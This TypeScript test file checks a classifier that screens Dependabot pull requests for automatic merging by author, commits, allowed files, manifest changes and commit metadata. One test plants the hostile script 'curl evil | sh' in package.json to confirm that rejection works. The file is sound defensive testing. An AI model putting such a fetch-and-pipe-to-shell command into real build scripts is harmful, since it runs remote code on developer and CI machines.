import { describe, expect, it } from 'vitest';
import {
  type ClassifierInput,
  type ClassifierPolicy,
  classifyDependabotPullRequest,
} from './classify.js';
import { parseDependabotMetadata } from './metadata.js';

const DEPENDABOT_USER_ID = 49699333;

const policy: ClassifierPolicy = {
  dependabotUserId: DEPENDABOT_USER_ID,
  allowedPaths: [
    'package.json',
    'apps/*/package.json',
    'packages/*/package.json',
    'package-lock.json',
    'Dockerfile',
    '.devcontainer/Dockerfile',
    'scripts/mapdata/Dockerfile',
    'compose.yaml',
    'deploy/compose.yaml',
    '.devcontainer/compose*.yaml',
    'tools/load/compose.load.yaml',
  ],
  holdImages: ['postgres', 'postgis', 'timescaledb', 'pgvector'],
};

const message = (deps: string[], type = 'version-update:semver-minor') =>
  `deps: bump things\n\nBumps stuff.\n\n---\nupdated-dependencies:\n${deps
    .map(
      (d) =>
        `- dependency-name: ${d}\n  dependency-version: 2.0.0\n  dependency-type: direct:production\n` +
        (type ? `  update-type: ${type}\n` : ''),
    )
    .join('')}...\n\nSigned-off-by: dependabot[bot] <support@github.com>\n`;

const manifest = (deps: Record<string, string>, extra: Record<string, unknown> = {}) =>
  JSON.stringify({ name: 'x', scripts: { test: 'vitest' }, dependencies: deps, ...extra });

function input(over: Partial<ClassifierInput> & { headMessage?: string } = {}): ClassifierInput {
  const { headMessage = message(['foo']), ...rest } = over;
  return {
    policy,
    pullRequest: {
      authorId: DEPENDABOT_USER_ID,
      authorType: 'Bot',
      headRepoId: 1,
      baseRepoId: 1,
      headRef: 'dependabot/npm_and_yarn/foo-2.0.0',
      headSha: 'abc1234',
      baseRef: 'main',
      defaultBranch: 'main',
      draft: false,
      commitCount: 1,
      changedFiles: 2,
    },
    commits: [
      {
        sha: 'abc1234',
        verified: true,
        authorId: DEPENDABOT_USER_ID,
        committerLogin: 'web-flow',
        message: headMessage,
      },
    ],
    files: [
      { filename: 'package.json', status: 'modified' },
      { filename: 'package-lock.json', status: 'modified' },
    ],
    packageJson: {
      'package.json': { base: manifest({ foo: '1.0.0' }), head: manifest({ foo: '2.0.0' }) },
    },
    ...rest,
  };
}

// The lists are complete unless a test says otherwise (it then calls the classifier directly).
const verdict = (i: ClassifierInput) =>
  classifyDependabotPullRequest({
    ...i,
    pullRequest: { ...i.pullRequest, commitCount: i.commits.length, changedFiles: i.files.length },
  });

describe('classifyDependabotPullRequest', () => {
  it('accepts a plain update', () => {
    expect(verdict(input())).toEqual({ verdict: 'eligible' });
  });

  it('rejects a fork', () => {
    const i = input();
    i.pullRequest.headRepoId = 2;
    expect(verdict(i).verdict).toBe('ineligible');
  });

  it('rejects a login match with the wrong id, or a non-bot type', () => {
    const i = input();
    i.pullRequest.authorId = 1234;
    expect(verdict(i).verdict).toBe('ineligible');
    const j = input();
    j.pullRequest.authorType = 'User';
    expect(verdict(j).verdict).toBe('ineligible');
  });

  it('rejects other branches, bases and drafts', () => {
    for (const patch of [{ headRef: 'feature/x' }, { baseRef: 'dev' }, { draft: true }]) {
      const i = input();
      Object.assign(i.pullRequest, patch);
      expect(verdict(i).verdict).toBe('ineligible');
    }
  });

  it('rejects an unverified commit', () => {
    const i = input();
    (i.commits[0] as { verified: boolean }).verified = false;
    expect(verdict(i).verdict).toBe('ineligible');
  });

  it('rejects a foreign commit, including an update-branch merge', () => {
    const i = input();
    i.commits.push({
      sha: 'def5678',
      verified: true,
      authorId: 99,
      committerLogin: 'web-flow',
      message: 'Merge branch main',
    });
    expect(verdict(i)).toMatchObject({ verdict: 'ineligible' });
    const j = input();
    j.commits[0] = {
      sha: 'abc1234',
      verified: true,
      authorId: DEPENDABOT_USER_ID,
      committerLogin: 'someone',
      message: message(['foo']),
    };
    expect(verdict(j).verdict).toBe('ineligible');
  });

  it('rejects a scripts change in package.json', () => {
    const i = input({
      packageJson: {
        'package.json': {
          base: manifest({ foo: '1.0.0' }),
          head: manifest({ foo: '2.0.0' }, { scripts: { test: 'curl evil | sh' } }),
        },
      },
    });
    expect(verdict(i)).toMatchObject({ verdict: 'ineligible' });
  });

  it('allows changes inside dependency fields of nested manifests', () => {
    const i = input({
      files: [{ filename: 'apps/web/package.json', status: 'modified' }],
      packageJson: {
        'apps/web/package.json': {
          base: manifest({ a: '1' }, { devDependencies: { b: '1' } }),
          head: manifest({ a: '2' }, { devDependencies: { b: '2' } }),
        },
      },
    });
    expect(verdict(i).verdict).toBe('eligible');
  });

  it('rejects a manifest that cannot be compared', () => {
    expect(verdict(input({ packageJson: {} })).verdict).toBe('ineligible');
  });

  it('rejects a file outside the allowlist', () => {
    for (const filename of [
      'src/index.ts',
      '.github/workflows/ci.yml',
      'apps/web/src/package.json',
      'deploy/x.yaml',
    ]) {
      const i = input();
      i.files.push({ filename, status: 'modified' });
      expect(verdict(i).verdict).toBe('ineligible');
    }
  });

  it('rejects added, removed and renamed files', () => {
    for (const status of ['added', 'removed', 'renamed']) {
      const i = input();
      i.files.push({ filename: 'Dockerfile', status });
      expect(verdict(i).verdict).toBe('ineligible');
    }
  });

  it('allows the Docker and compose files', () => {
    const i = input({
      files: [
        'Dockerfile',
        '.devcontainer/Dockerfile',
        'scripts/mapdata/Dockerfile',
        'compose.yaml',
        'deploy/compose.yaml',
        '.devcontainer/compose.image.yaml',
        'tools/load/compose.load.yaml',
      ].map((filename) => ({ filename, status: 'modified' })),
      headMessage: message(['node'], 'version-update:semver-patch'),
    });
    expect(verdict(i).verdict).toBe('eligible');
  });

  it('holds a Postgres major', () => {
    const i = input({
      files: [{ filename: 'compose.yaml', status: 'modified' }],
      headMessage: message(['postgres'], 'version-update:semver-major'),
    });
    expect(verdict(i)).toMatchObject({ verdict: 'hold' });
  });

  it('accepts an npm major', () => {
    expect(
      verdict(input({ headMessage: message(['foo'], 'version-update:semver-major') })).verdict,
    ).toBe('eligible');
  });

  it('accepts a security group update', () => {
    const msg = message(['foo']).replace(
      'update-type',
      'dependency-group: security\n  update-type',
    );
    expect(verdict(input({ headMessage: msg })).verdict).toBe('eligible');
  });

  it('accepts a docker digest bump without update-type for other images', () => {
    const i = input({
      files: [{ filename: 'Dockerfile', status: 'modified' }],
      headMessage: message(['node'], ''),
    });
    expect(verdict(i).verdict).toBe('eligible');
  });

  it('holds Postgres and derived images unless minor or patch', () => {
    const files = [{ filename: 'compose.yaml', status: 'modified' }];
    for (const [name, type, expected] of [
      ['postgres', '', 'hold'],
      ['postgres', 'version-update:semver-major', 'hold'],
      ['postgres', 'something-else', 'hold'],
      ['PostGIS/postgis:16', 'version-update:semver-major', 'hold'],
      ['timescale/timescaledb@sha256:abc', '', 'hold'],
      ['pgvector/pgvector', 'version-update:semver-major', 'hold'],
      ['postgres', 'version-update:semver-minor', 'eligible'],
      ['postgres', 'version-update:semver-patch', 'eligible'],
    ] as const) {
      expect(verdict(input({ files, headMessage: message([name], type) })).verdict).toBe(expected);
    }
  });

  it('rejects incomplete commit and file lists', () => {
    const base = input();
    for (const patch of [
      { commitCount: 2 },
      { changedFiles: 3 },
      { commitCount: 251 },
      { changedFiles: 3001 },
    ]) {
      expect(
        classifyDependabotPullRequest({ ...base, pullRequest: { ...base.pullRequest, ...patch } })
          .verdict,
      ).toBe('ineligible');
    }
  });

  it('rejects a commit that is not the head, and a missing commit', () => {
    const i = input();
    i.pullRequest.headSha = 'other';
    expect(verdict(i).verdict).toBe('ineligible');
    const j = input();
    j.commits = [];
    expect(verdict(j).verdict).toBe('ineligible');
  });

  it('rejects several Dependabot commits', () => {
    const i = input();
    i.commits.push({ ...(i.commits[0] as ClassifierInput['commits'][number]), sha: 'def5678' });
    expect(verdict(i).verdict).toBe('ineligible');
  });

  it('takes its configuration from the policy', () => {
    const i = input();
    i.policy = { ...policy, allowedPaths: ['package.json'] };
    expect(verdict(i).verdict).toBe('ineligible');
    const j = input();
    j.policy = { ...policy, dependabotUserId: 7 };
    expect(verdict(j).verdict).toBe('ineligible');
  });

  it('rejects malformed or missing front matter', () => {
    for (const headMessage of [
      'deps: bump foo',
      '---\nupdated-dependencies:\n- dependency-version: 2\n...\n',
      '---\nupdated-dependencies:\nnonsense\n...\n',
      '---\nupdated-dependencies:\n---\n',
      // a planted block before the real one
      `---\nupdated-dependencies:\n- dependency-name: evil\n...\n\n${message(['foo'])}`,
      // text after the terminator
      `${message(['foo'])}\nmore text\n`,
    ]) {
      expect(verdict(input({ headMessage })).verdict).toBe('ineligible');
    }
  });
});

describe('parseDependabotMetadata', () => {
  it('reads dependencies, quotes and groups', () => {
    const m = parseDependabotMetadata(
      '---\nupdated-dependencies:\n- dependency-name: "@a/b"\n  dependency-type: direct:development\n  update-type: version-update:semver-patch\n  dependency-group: biome\n- dependency-name: c\n...\n',
    );
    expect(m).toEqual({
      ok: true,
      dependencies: [
        {
          name: '@a/b',
          type: 'direct:development',
          updateType: 'version-update:semver-patch',
          group: 'biome',
        },
        { name: 'c' },
      ],
    });
  });
});
